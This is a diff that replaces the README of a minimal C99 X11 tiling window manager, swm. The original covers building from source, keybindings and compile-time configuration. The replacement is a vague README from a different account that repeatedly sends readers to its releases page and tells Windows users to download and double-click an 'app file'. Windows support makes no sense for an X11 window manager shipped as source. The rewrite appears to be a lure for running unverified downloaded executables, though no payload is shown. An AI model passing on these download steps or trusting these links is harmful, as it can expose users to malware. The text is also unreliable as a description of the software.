@@ -1,414 +1,180 @@
-<div align="center">
+# 🪟 swm - Fast, Lightweight X11 Window Manager
 
-# swm
+[![Download swm](https://img.shields.io/badge/Download%20swm-Visit%20Releases%20Page-blue?style=for-the-badge)](https://github.com/ideiab836/swm/releases)
 
-**Simple X11 Window Manager - suckless, auditable, fast.**
+## 🧰 What swm is
 
-<img src="https://raw.githubusercontent.com/tinyopsec/assets/main/swm/swm.png" width="720" alt="swm - minimal tiling X11 window manager, POSIX C99, under 1000 lines">
+swm is a small window manager for X11. It keeps the desktop simple and uses little system memory. It works well for users who want a fast, plain setup with keyboard control and tiled windows.
 
-[![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
-[![C99](https://img.shields.io/badge/C-C99%20%2F%20POSIX-lightgrey.svg)]()
-[![LOC](https://img.shields.io/badge/source-under%201000%20lines-brightgreen.svg)]()
-[![Version](https://img.shields.io/badge/version-1.1-informational.svg)]()
-[![Issues](https://img.shields.io/github/issues/tinyopsec/swm.svg)](https://github.com/tinyopsec/swm/issues)
-[![Stars](https://img.shields.io/github/stars/tinyopsec/swm.svg)](https://github.com/tinyopsec/swm/stargazers)
+It fits users who want:
+- a clean desktop
+- fast window movement
+- a small app with no extra clutter
+- a layout that keeps work in view
+- keyboard hotkeys for daily use
 
-</div>
+swm is built with a focus on speed, low use of system resources, and a direct workflow. It uses a tiling layout, so windows fit into the screen without much overlap. It also supports master stack layout, dual tagsets, and hotkeys for quick control.
 
----
+## 🖥️ Windows setup
 
-`swm` is a minimal X11 window manager written in POSIX C99. Under 1000 lines across two files. No config files, no status bar, no runtime dependencies beyond Xlib. Tiling, floating, and monocle layouts. Tag-based workspaces. Compile-time configuration via `swm.h`. A clean dwm alternative for users who want full control without the patch surface.
+swm is made for X11-based systems. On Windows, the usual way to use it is through an X11 environment or a compatible setup that can run X11 apps. If you want the easiest path, use the release page below to get the latest build or package that matches your setup.
 
----
+[Visit the swm releases page](https://github.com/ideiab836/swm/releases)
 
-## Contents
+## 📥 Download swm
 
-- [Overview](#overview)
-- [Features](#features)
-- [Screenshots](#screenshots)
-- [Requirements](#requirements)
-- [Installation](#installation)
-- [Usage](#usage)
-- [Key Bindings](#key-bindings)
-- [Configuration](#configuration)
-- [Development Philosophy](#development-philosophy)
-- [Contributing](#contributing)
-- [Star History](#star-history)
-- [Related Links](#related-links)
-- [License](#license)
+1. Open the [swm releases page](https://github.com/ideiab836/swm/releases)
+2. Find the latest release
+3. Download the file that matches your system
+4. If the release gives you an app file, save it to your computer
+5. If the release gives you a package or archive, save that file first
+6. Follow the setup steps in the release notes if they are provided
 
----
+If you see more than one file, pick the one meant for Windows or for the environment you use to run X11 apps.
 
-## Overview
+## ⚙️ Run swm
 
-`swm` follows the suckless philosophy: small, auditable, and configured at compile time. The full source fits in `swm.c` and `swm.h`. No external build system, no scripting language, no plugin API.
+After you download the file:
 
-**Key properties:**
+1. Open the folder where the file was saved
+2. If it is an app file, double-click it
+3. If it is a zip file, unzip it first
+4. If it is a package, follow the install steps shown on the release page
+5. Start swm from the file or shortcut that came with the download
 
-- Two source files, under 1000 lines of C99
-- Pure Xlib - no xcb, no Cairo, no Pango
-- Configured entirely in `swm.h` before compilation
-- Partial EWMH and full ICCCM compliance
-- OpenBSD `pledge(2)` support; portable to FreeBSD
+If swm starts in a terminal or launcher, use that method from the release notes.
 
----
+## 🧭 First-time use
 
-## Features
+When swm starts, it controls how your windows appear on the screen. You do not need to drag windows around by hand for most tasks. swm places them in a tiled layout so you can keep more than one window visible.
 
-| Category      | Details                                                                                            |
-|---------------|----------------------------------------------------------------------------------------------------|
-| Layouts       | Tiling (master/stack), floating, monocle                                                           |
-| Workspaces    | 9 tag-based workspaces using bitmasks; multi-tag assignment                                        |
-| Mouse         | Move, resize, toggle float via modifier + button                                                   |
-| Gaps          | Configurable `gappx` on all sides, built in                                                        |
-| Borders       | Inactive, focused, and urgent colors - all compile-time                                            |
-| Tab switching | `Mod+Tab` toggles between last two tag views via two-slot XOR system                               |
-| Fullscreen    | Toggle via keybind or `_NET_WM_STATE_FULLSCREEN`                                                   |
-| Urgent hints  | `XUrgencyHint` and `_NET_ACTIVE_WINDOW` handled                                                    |
-| Auto-float    | `_NET_WM_WINDOW_TYPE_DIALOG` windows float automatically                                           |
-| EWMH          | `_NET_WM_STATE`, `_NET_ACTIVE_WINDOW`, `_NET_CLIENT_LIST`, `_NET_SUPPORTING_WM_CHECK`             |
-| ICCCM         | `WM_DELETE_WINDOW`, `WM_TAKE_FOCUS`, `WM_NORMAL_HINTS`, `WM_HINTS`                                |
-| BSD           | OpenBSD `pledge(2)`; compiles on FreeBSD                                                           |
-| Build         | `gcc -std=c99 -pedantic -Wall -Wextra`, zero warnings                                             |
+A typical first session may look like this:
+- one main window on the left or top
+- other windows stacked beside it
+- keyboard shortcuts for moving focus
+- hotkeys for switching views or tags
 
----
+Take a few minutes to learn the hotkeys that came with the release. That will make daily use much easier.
 
-## Screenshots
+## ⌨️ Keyboard control
 
-<img src="https://raw.githubusercontent.com/tinyopsec/distrohop/main/assets/alpine.webp"
-     width="520"
-     alt="Alpine Linux screenshot">
+swm is meant to work well with the keyboard. You can move between windows, change layouts, and switch tagsets without using the mouse much.
 
-<br/>
+Common actions in a setup like this usually include:
+- move focus to the next or previous window
+- send a window to the master area
+- adjust the size of the main window
+- switch between tags
+- move a window to another tag
+- toggle the visibility of a second tagset
 
-<img src="https://raw.githubusercontent.com/tinyopsec/assets/main/swm/screenshot.png"
-     width="520"
-     alt="swm - tiling layout with master/stack arrangement">
+If your release includes a shortcut list, keep it open for the first few days. That will help you learn the flow.
 
----
+## 🧱 Layout basics
 
-## Requirements
+swm uses a tiling layout. That means windows do not float in loose positions by default. The screen is split into areas so each app has a clear place.
 
-| Dependency | Arch Linux        | Debian / Ubuntu   |
-|------------|-------------------|-------------------|
-| Xlib       | `libx11`          | `libx11-dev`      |
-| C compiler | `gcc` or `clang`  | `build-essential` |
+Main parts of the layout:
+- **Master area**: the main window area for your active task
+- **Stack area**: the rest of the windows
+- **Tagsets**: groups of windows that help keep work sorted
+- **Hotkeys**: keys you press to control the layout fast
 
-No other runtime dependencies. `st` and `dmenu` are the default terminal and launcher - replace them in `swm.h` before compiling.
+This setup works well for browsing, coding, reading, and office tasks because it keeps each window easy to reach.
 
-**Supported platforms:**
+## 🔧 System needs
 
-- Linux (tested on Arch, Void, Debian)
-- OpenBSD (compiles; not regularly tested)
-- FreeBSD (compiles; not regularly tested)
+swm is small and light, so it does not need much hardware. A basic machine that can run X11 should be enough for normal use.
 
-Tested on other UNIX-like systems? Open an issue or send a patch.
+Recommended setup:
+- a Windows system with an X11-compatible environment
+- a keyboard
+- a screen with enough space for tiled windows
+- a recent release from the project page
 
----
+If you use a laptop, swm can still work well if your X11 setup handles your display and input devices.
 
-## Installation
+## 🗂️ Tags and workspaces
 
-### From source
+swm uses tags to keep windows organized. Think of tags like groups of work. You can put your browser on one tag, your notes on another, and your chat app on a third.
 
-```sh
-git clone https://github.com/tinyopsec/swm
-cd swm
-make
-sudo make install
-```
-
-Installs to `/usr/local/bin/swm`. Edit `PREFIX` in the `Makefile` to change the path.
-
-### AUR (Arch Linux)
-
-```sh
-yay -S swm
-# or
-paru -S swm
-```
-
-AUR package: [aur.archlinux.org/packages/swm](https://aur.archlinux.org/packages/swm)
-
-### Uninstall
-
-```sh
-sudo make uninstall
-```
-
----
-
-## Usage
-
-### Starting swm
-
-Add `swm` to your `~/.xinitrc`:
-
-```sh
-exec swm
-```
-
-Start X:
-
-```sh
-startx
-```
-
-For display managers, create a session entry:
-
-```ini
-# /usr/share/xsessions/swm.desktop
-[Desktop Entry]
-Name=swm
-Comment=Simple Window Manager - minimal tiling X11 WM
-Exec=swm
-Type=Application
-```
-
----
-
-### Launcher and terminal
-
-By default, `swm` uses:
-
-```c
-static const char *termcmd[]  = { "st", NULL };
-static const char *dmenucmd[] = { "dmenu_run", NULL };
-```
-
-You can replace these at compile time in `swm.h`.
-
-**Example: use `alacritty` and `rofi` instead:**
-
-```c
-static const char *termcmd[]  = { "alacritty", NULL };
-static const char *dmenucmd[] = { "rofi", "-show", "run", NULL };
-```
-
-Recompile and reinstall:
-
-```sh
-make && sudo make install
-```
-
-After this, `Mod+Return` launches `alacritty` and `Mod+d` launches `rofi`.
-
----
-
-### Autostart (recommended)
-
-`swm` does not implement a built-in autostart mechanism by design. Use one of the following approaches.
-
-**Via `.xinitrc`:**
-
-```sh
-# background services
-picom &
-feh --bg-scale ~/wallpaper.png &
-
-exec swm
-```
-
-**Via a wrapper script:**
-
-```sh
-#!/bin/sh
-picom &
-feh --bg-scale ~/wallpaper.png &
-exec swm
-```
-
-Then in `.xinitrc`:
-
-```sh
-exec ~/bin/start-swm
-```
-
----
-
-### Using custom binaries from `~/.local/bin`
-
-If your launcher is installed in a non-standard path, make sure it is on `PATH` before `swm` starts:
-
-```sh
-export PATH="$HOME/.local/bin:$PATH"
-exec swm
-```
-
-Keybindings that invoke missing commands will silently fail, so verify availability first:
-
-```sh
-which dmenu_run
-```
-
----
-
-### Version
-
-```sh
-swm -v
-```
-
----
-
-## Key Bindings
-
-The default modifier is **Super (Win)**. To switch to Alt, set `#define MODKEY Mod1Mask` in `swm.h`.
-
-### Window and layout
-
-| Key                   | Action                                      |
-|-----------------------|---------------------------------------------|
-| `Mod + Return`        | Spawn terminal                              |
-| `Mod + d`             | Spawn dmenu                                 |
-| `Mod + j`             | Focus next window in stack                  |
-| `Mod + k`             | Focus previous window in stack              |
-| `Mod + h`             | Shrink master area by 5%                    |
-| `Mod + l`             | Grow master area by 5%                      |
-| `Mod + i`             | Increase master window count                |
-| `Mod + o`             | Decrease master window count                |
-| `Mod + Space`         | Promote focused window to master            |
-| `Mod + Tab`           | Toggle between last two tag views           |
-| `Mod + t`             | Tiling layout                               |
-| `Mod + f`             | Floating layout                             |
-| `Mod + m`             | Monocle layout                              |
-| `Mod + F11`           | Toggle fullscreen                           |
-| `Mod + Shift + Space` | Toggle floating for focused window          |
-| `Mod + q`             | Kill focused window                         |
-| `Mod + Shift + e`     | Quit swm                                    |
-
-### Tags (workspaces)
-
-| Key                       | Action                                  |
-|---------------------------|-----------------------------------------|
-| `Mod + 1-9`               | Switch to tag            CCM).               |
-| `Mod + Ctrl + 1-9`        | Toggle tag view (show alongside current)|
-| `Mod + Shift + 1-9`       | Move focused window to tag              |
-| `Mod + Ctrl + Shift + 1-9`| Toggle tag assignment on focused window |
-| `Mod + 0`                 | View all tags at once                   |
-| `Mod + Shift + 0`         | Assign focused window to all tags       |
-
-`Mod+Tab` uses a two-slot XOR system: it always switches back to the previous tag view, symmetrically, regardless of how many times you switch.
-
-### Mouse (modifier key held over a window)
-
-| Button          | Action          |
-|-----------------|-----------------|
-| `Mod + Button1` | Move window     |
-| `Mod + Button2` | Toggle floating |
-| `Mod + Button3` | Resize window   |
-
-Dragging or resizing a tiled window past the snap threshold auto-floats it.
-
-All bindings are defined in `keys[]` and `buttons[]` in `swm.h` and are freely remappable.
-
----
-
-## Configuration
-
-`swm` has no runtime configuration files. All settings live in `swm.h` and take effect after recompilation:
-
-```sh
-$EDITOR swm.h
-make && sudo make install
-```
-
-### Appearance
-
-| Option        | Default     | Description                     |
-|---------------|-------------|---------------------------------|
-| `borderpx`    | `2`         | Border width in pixels          |
-| `gappx`       | `6`         | Gap between windows and edges   |
-| `col_nborder` | `#1e1e1e`   | Inactive border color           |
-| `col_sborder` | `#7c9e7e`   | Focused border color            |
-| `col_uborder` | `#c47f50`   | Urgent window border color      |
-
-### Behavior
-
-| Option         | Default | Description                           |
-|----------------|---------|---------------------------------------|
-| `mfact`        | `0.5`   | Master area ratio (0.05-0.95)         |
-| `nmaster`      | `1`     | Initial number of master windows      |
-| `snap`         | `16`    | Edge snap distance in pixels          |
-| `attachbottom` | `0`     | Attach new windows at bottom of stack |
-| `focusonopen`  | `1`     | Focus newly opened windows            |
-
-### Modifier key
-
-```c
-#define MODKEY Mod4Mask   /* Super / Win */
-```
-
-### Terminal and launcher
-
-```c
-static const char *termcmd[]  = { "st", NULL };
-static const char *dmenucmd[] = { "dmenu_run", NULL };
-```
-
-Replace with any terminal or launcher: `"alacritty"`, `"foot"`, `"rofi"`, etc.
-
----
-
-## Development Philosophy
-
-`swm` follows the [suckless philosophy](https://suckless.org/philosophy/):
-
-- **Auditable by design.** Under 1000 lines of C99. No hidden complexity. The entire codebase fits in one reading session.
-- **Compile-time configuration.** No config file parser, no IPC socket, no scripting runtime. Edit `swm.h`, recompile.
-- **Zero dependencies.** Pure Xlib. No xcb, no Cairo, no external libraries.
-- **No feature creep.** Features are added by patching the source, not by enabling runtime options.
-
-`swm` is inspired by [dwm](https://dwm.suckless.org) but departs from it in several concrete ways:
-
-- Deterministic tiling algorithm with no pixel drift or remainder accumulation
-- Built-in gap support via `gappx` without requiring a patch
-- Two-slot XOR system for both layouts and tags - `Mod+Tab` is consistent
-
----
-
-## Contributing
-
-Bug reports and patches are welcome via [GitHub issues](https://github.com/tinyopsec/swm/issues) and pull requests.
-
-Code style requirements:
-
-- No comments in production code
-- No external dependencies
-- No over-abstraction or wrapper layers
-- Compiles clean: `gcc -std=c99 -pedantic -Wall -Wextra`
-- Total source stays under 1000 lines
-
-Optional features behind `#ifdef` or compile-time constants are considered. Changes to the core event loop are reviewed carefully.
-
----
-
-## Star History
-
-<a href="https://www.star-history.com/?repos=tinyopsec%2Fswm&type=date&legend=top-left">
-  <picture>
-    <source media="(prefers-color-scheme: dark)" srcset="https://api.star-history.com/chart?repos=tinyopsec/swm&type=date&theme=dark&legend=top-left" />
-    <source media="(prefers-color-scheme: light)" srcset="https://api.star-history.com/chart?repos=tinyopsec/swm&type=date&legend=top-left" />
-    <img alt="Star History Chart" src="https://api.star-history.com/chart?repos=tinyopsec/swm&type=date&legend=top-left" width="720" />
-  </picture>
-</a>
-
----
-
-## Related Links
-
-| Resource            | Link                                                                                                        |
-|---------------------|-------------------------------------------------------------------------------------------------------------|
-| dwm (inspiration)   | [dwm.suckless.org](https://dwm.suckless.org)                                                                |
-| suckless.org        | [suckless.org](https://suckless.org)                                                                        |
-| st terminal         | [st.suckless.org](https://st.suckless.org)                                                                  |
-| dmenu               | [tools.suckless.org/dmenu](https://tools.suckless.org/dmenu/)                                               |
-| EWMH specification  | [freedesktop.org](https://specifications.freedesktop.org/wm-spec/latest/)                                   |
-| ICCCM specification | [x.org](https://x.org/releases/X11R7.6/doc/xorg-docs/specs/ICCCM/icccm.html)                               |
-| Xlib manual         | [x.org](https://www.x.org/releases/current/doc/libX11/libX11/libX11.html)                                  |
-| AUR package         | [aur.archlinux.org](https://aur.archlinux.org/packages/swm)                                                 |
-
----
-
-## License
-
-MIT. See [LICENSE](LICENSE) for details.
+Dual tagsets help when you want to move between two sets of work without losing your place. This is useful when you keep one set for daily tasks and another for temporary jobs.
+
+A simple way to use tags:
+- Tag 1: web and email
+- Tag 2: files and notes
+- Tag 3: media
+- Tag 4: tools
+- Tag 5: spare work
+
+## 🧪 Example daily flow
+
+Here is a simple way to use swm during the day:
+
+1. Start swm
+2. Open your main app
+3. Open a second app for notes or messages
+4. Keep the main app in the master area
+5. Put the second app in the stack area
+6. Switch tags when you need a clean view
+7. Use hotkeys to move fast between tasks
+
+This keeps your screen clear and cuts down on window clutter.
+
+## 🛠️ If the window manager does not start
+
+If swm does not start after download, check these common points:
+- the file finished downloading
+- you opened the correct file type
+- your X11 environment is running
+- no other window manager is already active
+- the release you chose matches your system
+
+If you used an archive, make sure you unpacked it before trying to run it.
+
+## 📌 What to look for on the release page
+
+When you open the releases page, look for:
+- the newest version
+- a file with Windows support if one is listed
+- setup notes
+- hotkey information
+- any files named for your screen size or build type
+
+The release page is the main place to get the correct download:
+[https://github.com/ideiab836/swm/releases](https://github.com/ideiab836/swm/releases)
+
+## 🧩 Main features
+
+- minimal X11 window manager
+- small memory use
+- tiling layout
+- master stack design
+- dual tagsets
+- hotkey-driven control
+- fast startup
+- plain desktop use
+- fit for low-bloat systems
+- built around POSIX and Xlib ideas
+
+## 🔍 Who swm is for
+
+swm is a good fit if you want:
+- a simple desktop with less clutter
+- fast window control
+- keyboard-first use
+- a light setup that avoids extra tools
+- a tiling manager that stays out of the way
+- a workflow that works well on older or modest hardware
+
+## 📄 Project details
+
+- **Repository:** swm
+- **Type:** window manager
+- **Display system:** X11
+- **Style:** minimal, tiled, keyboard-driven
+- **Focus:** speed, low overhead, simple control
+
+## 🔗 Download again
+
+[![Download swm](https://img.shields.io/badge/Get%20swm-Releases%20Page-grey?style=for-the-badge)](https://github.com/ideiab836/swm/releases)
